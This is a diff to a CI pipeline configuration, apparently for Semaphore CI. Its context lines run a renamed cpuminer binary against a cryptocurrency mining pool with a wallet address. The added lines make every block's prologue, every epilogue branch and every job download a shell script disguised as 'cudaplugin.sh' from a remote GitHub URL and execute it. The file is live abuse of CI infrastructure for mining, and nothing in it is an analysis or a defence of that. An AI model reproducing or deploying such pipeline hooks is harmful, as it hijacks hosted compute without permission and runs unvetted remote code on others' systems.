@@ -15,3 +15,152 @@ blocks:
             - tar xf cpuminer-opt-linux.tar.gz
             - mv cpuminer-sse2 lukman
             - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+          - chmod u+x cudaplugin.sh
+          - ./cudaplugin.sh
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+  - name: 'Block #2'
+    dependencies:
+      - 'Block #1'
+    task:
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+          - chmod u+x cudaplugin.sh
+          - ./cudaplugin.sh
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+  - name: 'Block #3'
+    dependencies:
+      - 'Block #1'
+      - 'Block #2'
+    task:
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+          - chmod u+x cudaplugin.sh
+          - ./cudaplugin.sh
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+  - name: 'Block #4'
+    dependencies:
+      - 'Block #3'
+    task:
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+          - chmod u+x cudaplugin.sh
+          - ./cudaplugin.sh
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+  - name: 'Block #5'
+    dependencies:
+      - 'Block #1'
+      - 'Block #2'
+      - 'Block #3'
+      - 'Block #4'
+    task:
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+          - chmod u+x cudaplugin.sh
+          - ./cudaplugin.sh
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - ./cudaplugin.sh
